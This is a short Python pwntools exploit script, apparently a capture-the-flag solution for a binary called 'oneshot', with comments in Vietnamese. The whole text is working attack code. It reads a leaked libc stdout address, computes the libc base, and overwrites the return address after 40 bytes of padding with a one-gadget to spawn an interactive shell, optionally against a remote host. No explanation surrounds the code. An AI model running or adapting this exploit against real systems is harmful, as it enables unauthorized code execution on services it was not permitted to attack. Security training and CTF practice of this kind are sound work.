from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./oneshot"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
libc = ELF("./libc.so.6", checksec=False)

# Get offset of stdout in libc
stdout_offset = libc.sym['_IO_2_1_stdout_']
print("Offset của stdout trong libc:", hex(stdout_offset))

io = start()
input()
padding = 40

stdout_leak = io.recvline().decode().split(":")[1].strip()
stdout_leak = int(stdout_leak, 16)
libc_base = stdout_leak - stdout_offset
print("Địa chỉ của stdout:", hex(stdout_leak))
print("Địa chỉ của libc base:", hex(libc_base))

# pop_rdi = 0x0000000000000b53 + libc_base
# pop_rsi = 0x0000000000000b51 + libc_base
bin_sh = libc_base + 0x45216
# log.info(f"Address of /bin/sh: {hex(bin_sh)}")
# pop_rax = 0x0000000000000287 + libc_base

payload = flat(
    b"\x00" * padding,
    p64(bin_sh)
)

# write('payload', payload)

io.sendafter(b"MSG: ",payload)

io.interactive()